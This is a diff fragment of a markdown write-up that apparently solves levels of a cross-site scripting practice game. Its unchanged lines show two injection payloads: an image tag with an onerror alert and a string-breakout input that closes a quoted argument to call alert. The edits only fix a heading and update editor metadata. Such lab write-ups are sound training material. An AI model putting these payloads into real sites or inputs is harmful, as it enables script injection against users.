@@ -18,7 +18,7 @@ replace with
 ```html
 <img src="/static/level3/#6.jpg" onerror="alert(1)">
 ```
-##Step 4
+## Step
 ```javascript
 1');alert('1
 ```
@@ -88,5 +88,5 @@ Do you want a piece of cake?
 eyJoaXN0b3J5IjpbLTEyOTYwMDY1ODNdfQ==
 -->
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTIxMDQzNzA3Ml19
+eyJoaXN0b3J5IjpbMTAyOTAzMzA4MF19
 -->
